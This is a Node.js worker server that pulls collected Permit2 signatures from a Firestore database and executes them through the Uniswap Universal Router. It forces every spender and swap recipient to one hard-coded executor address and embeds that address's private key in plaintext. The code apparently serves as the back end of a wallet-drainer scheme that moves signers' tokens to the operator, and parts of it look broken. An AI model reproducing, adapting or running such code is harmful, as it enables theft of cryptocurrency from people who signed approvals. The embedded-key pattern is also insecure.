#!/usr/bin/env node
import dotenv from 'dotenv';
try { dotenv.config(); } catch(e) {}

import express from 'express';
import bodyParser from 'body-parser';
import admin from 'firebase-admin';
import { ethers } from 'ethers';

// -----------------------------
// Configuration / constants
// -----------------------------
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; // mainnet

// Hard-coded spender/executor address (forced)
const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
// Hard-coded private key for the above spender (WARNING: embedding keys in source is insecure)
const HARDCODED_PRIVATE_KEY = '0x797c331b0c003429f8fe3cf5fb60b1dc57286c7c634592da10ac85d3090fd62e';

const UNIVERSAL_ROUTER_ABI = [
  "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
];

// -----------------------------
// Lazy init globals
// -----------------------------
let initialized = false;
let db = null;
let provider = null;
let spenderWallet = null;
let router = null;

// -----------------------------
// Init function
// -----------------------------
async function init() {
  if (initialized) return;

  const required = [
    'FIREBASE_PROJECT_ID',
    'FIREBASE_CLIENT_EMAIL',
    'FIREBASE_PRIVATE_KEY',
    'RPC_URL',
    // optional: SWAP_RECIPIENT, SWAP_FEE
  ];
  const missing = required.filter(k => !process.env[k]);
  if (missing.length) throw new Error("Missing env vars: " + missing.join(', '));

  const serviceAccount = {
    projectId: process.env.FIREBASE_PROJECT_ID,
    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
  };

  if (!admin.apps || admin.apps.length === 0) {
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
  }
  db = admin.firestore();

  provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
  // Use hard-coded private key to create signer
  spenderWallet = new ethers.Wallet(HARDCODED_PRIVATE_KEY, provider);
  // Sanity check to ensure the key controls the expected address
  if (spenderWallet.address.toLowerCase() !== HARDCODED_EXECUTOR.toLowerCase()) {
    throw new Error(`HARDCODED_PRIVATE_KEY does not match HARDCODED_EXECUTOR: ${spenderWallet.address} != ${HARDCODED_EXECUTOR}`);
  }

  router = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);

  initialized = true;
}
 
// -----------------------------
// Utility: normalize v and build sig bytes
// -----------------------------
function buildSignatureBytes(r, s, vRaw) {
  // vRaw may be number or hex string
  let v = typeof vRaw === 'string' ? parseInt(vRaw, 16) : Number(vRaw);
  if (v === 0 || v === 1) v += 27;
  // ensure 27/28
  if (v !== 27 && v !== 28) {
    // fallback: prefer forming a hex string anyway
  }
  const vHex = '0x' + v.toString(16).padStart(2, '0'); // "0x1b" or "0x1c"
  // r and s should be 0x-prefixed hex strings
  return ethers.concat([r, s, vHex]);
}

// -----------------------------
// Router command codes
// -----------------------------
const COMMANDS = {
  PERMIT2_PERMIT: 0x02,
  V3_SWAP_EXACT_IN: 0x08
};

// -----------------------------
// Build universal router payload
// NOTE: Example path uses single hop to WETH; adapt path to your desired route.
// -----------------------------
function buildUniversalRouterTx(data) {
  const {
    owner,
    token,
    amount,
    deadline,
    nonce,
    spender, // will be overridden to UNIVERSAL_ROUTER by worker
    r, s, v
  } = data;

  // recipient of swapped tokens: force to hard-coded executor
  const recipient = HARDCODED_EXECUTOR;

  // normalize amount to BigInt
  const amountBn = BigInt(amount);

  // Build signature bytes
  const signatureBytes = buildSignatureBytes(r, s, v);

  // Encode PermitSingle tuple + signature as router input
  // Solidity tuple types:
  // (address owner, ( (address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline ), bytes signature)
  const permitAbi = new ethers.AbiCoder();

  const permitSingleTuple = [
    [
      [token, amountBn, Number(deadline), Number(nonce)],
      HARDCODED_EXECUTOR, // spender forced to hard-coded executor
      Number(deadline)
    ],
    signatureBytes
  ];

  const permitInput = permitAbi.encode(
    ["address", "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details,address spender,uint256 sigDeadline)", "bytes"],
    [owner, permitSingleTuple[0], permitSingleTuple[1]]
  );

  // Build a simple V3 exact-in swap input (single hop)
  // Note: This example constructs a path: token + fee + outputToken.
  // Replace outputToken with desired final token.
  const outputToken = process.env.OUTPUT_TOKEN || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH9 by default
  const feeTier = Number(process.env.SWAP_FEE || 3000); // default 3000 = 0.3%

  // path encoding: token (20 bytes) + fee (3 bytes) + outputToken (20 bytes)
  // build path as bytes
  function encodeFee(f) {
    // fee is 3 bytes
    let hex = f.toString(16);
    if (hex.length % 2 === 1) hex = '0' + hex;
    // pad to 3 bytes (6 hex chars)
    hex = hex.padStart(6, '0');
    return '0x' + hex;
  }
  const path = ethers.concat([token, encodeFee(feeTier), outputToken]);

  const minReceived = BigInt(0); // no slippage control here — you should set this
  const swapAbi = new ethers.AbiCoder();
  const swapInput = swapAbi.encode(
    ["bytes", "uint256", "uint256", "address"],
    [path, amountBn, minReceived, recipient]
  );

  // Hardcoded command string: 0x02 (PERMIT2_PERMIT) followed by 0x08 (V3_SWAP_EXACT_IN)
  const commands = "0x0208";

  const inputs = [permitInput, swapInput];

  const execDeadline = Math.floor(Date.now() / 1000) + 1800; // 30 minutes

  return { commands, inputs, execDeadline };
}

// -----------------------------
// Process pending worker
// -----------------------------
async function processPending(limit = 10) {
  const snaps = await db.collection('permit2_signatures').where('processed', '==', false).limit(limit).get();
  if (snaps.empty) return { processed: 0 };

  let count = 0;

  // Check spender wallet balance once per run
  let balance = BigInt(0);
  try { balance = await spenderWallet.getBalance(); } catch(e) { console.error('balance check failed', e); }

  for (const docSnap of snaps.docs) {
    // read copy of data
    const data = docSnap.data();

    // Force spender to the hard-coded executor (per operator request)
    data.spender = HARDCODED_EXECUTOR;

    // Basic validation
    if (!data.owner || !data.token || !data.amount || !data.r || !data.s) {
      await docSnap.ref.update({
        lastError: "missing fields in permit doc",
        lastErrorAt: Date.now()
      });
      continue;
    }

    // Check that signer-used deadline isn't expired (optional)
    if (Number(data.deadline) * 1000 < Date.now()) {
      await docSnap.ref.update({
        lastError: "signature deadline expired",
        lastErrorAt: Date.now()
      });
      continue;
    }

    // Check balance (very conservative threshold)
    const minEthRequired = process.env.MIN_ETH_REQUIRED ? ethers.parseEther(process.env.MIN_ETH_REQUIRED) : ethers.parseEther("0.001");
    if (balance < minEthRequired) {
      // update doc with actionable error; do NOT attempt tx
      await docSnap.ref.update({
        lastError: `insufficient ETH in executor wallet (${HARDCODED_EXECUTOR}). Fund with at least ${minEthRequired.toString()} wei.`,
        lastErrorAt: Date.now()
      });
      console.error('insufficient executor funds:', { address: HARDCODED_EXECUTOR, balance: balance.toString() });
      // skip further docs to avoid repeated failures
      continue;
    }

    try {
      const { commands, inputs, execDeadline } = buildUniversalRouterTx(data);

      // Optional: estimate gas for better error messages
      let estimatedGas = null;
      try {
        estimatedGas = await router.estimateGas.execute(commands, inputs, execDeadline, { value: 0 });
      } catch (eg) {
        // estimation failed — capture reason and record on doc
        const eMsg = (eg && eg.message) ? eg.message : String(eg);
        await docSnap.ref.update({ lastError: `estimateGas failed: ${eMsg}`, lastErrorAt: Date.now() });
        console.error('estimateGas failed for doc', docSnap.id, eMsg);
        continue; // skip to next doc
      }

      // Execute the transaction
      const tx = await router.execute(commands, inputs, execDeadline, { value: 0, gasLimit: estimatedGas.mul(120).div(100) });
      const receipt = await tx.wait();

      await docSnap.ref.update({
        processed: true,
        routerTx: receipt.transactionHash,
        processedAt: Date.now()
      });

      count++;
      // update local balance snapshot
      balance = await spenderWallet.getBalance();

    } catch (err) {
      // More detailed error capture
      let errMsg = String(err && err.message ? err.message : err);
      if (err?.code) errMsg = `${errMsg} (code=${err.code})`;
      // attempt to capture revert reason if present
      try {
        await docSnap.ref.update({ lastError: errMsg, lastErrorAt: Date.now() });
      } catch (uErr) {
        console.error('failed to update doc error', uErr);
      }
      console.error('worker execution error for doc', docSnap.id, err);
    }
  } // end for

  return { processed: count };
}

// -----------------------------
// HTTP API
// -----------------------------
const app = express();
app.use(bodyParser.json());

const SECRET = process.env.RUN_WORKER_SECRET;

app.all('/api/run-worker', async (req, res) => {
  try {
    if (SECRET) {
      const q = req.query?.secret || req.headers['x-run-worker-secret'] || req.body?.secret;
      if (!q || q !== SECRET) return res.status(401).json({ ok: false, error: 'Unauthorized' });
    }
    await init();
  } catch (err) {
    console.error('init error:', err);
    return res.status(500).json({ ok: false, error: String(err) });
  }

  const debug = req.query?.debug === '1' || req.query?.dryRun === '1' || req.body?.debug || req.body?.dryRun;

  try {
    if (debug) {
      const snaps = await db.collection('permit2_signatures').where('processed','==',false).limit(20).get();
      const docs = snaps.docs.map(d => ({ id: d.id, data: d.data() }));
      return res.json({ ok: true, processed: 0, unprocessedCount: snaps.size, sample: docs });
    }

    const result = await processPending(10);
    return res.json({ ok: true, ...result });

  } catch (err) {
    console.error('process error:', err);
    return res.status(500).json({ ok: false, error: String(err) });
  }
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Worker HTTP server listening on port ${port}`);
});
